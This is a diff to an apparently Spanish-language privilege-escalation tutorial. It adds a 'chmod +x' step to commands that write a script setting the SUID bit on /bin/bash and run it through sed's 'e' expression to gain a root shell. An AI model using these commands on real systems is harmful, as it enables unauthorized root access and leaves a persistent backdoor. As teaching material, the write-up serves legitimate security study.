@@ -327,6 +327,7 @@ Otra manera alternativa es el parametro -e o --expression que se sirve de un scr
 # Creamos el script /tmp/shell.sh
 bash-5.1$ echo '#!/bin/bash' > /tmp/shell.sh
 bash-5.1$ echo 'chmod u+s /bin/bash' >> /tmp/shell.sh
+bash-5.1$ chmod +x /tmp/shell.sh
 
 # Sustituimos el archivo de la lista por un modificado con el comando:
 # ```(sed) -e "1e /tmp/shell.sh" /tmp/shell.sh``` Cerrando y abriendo las comillas simples.
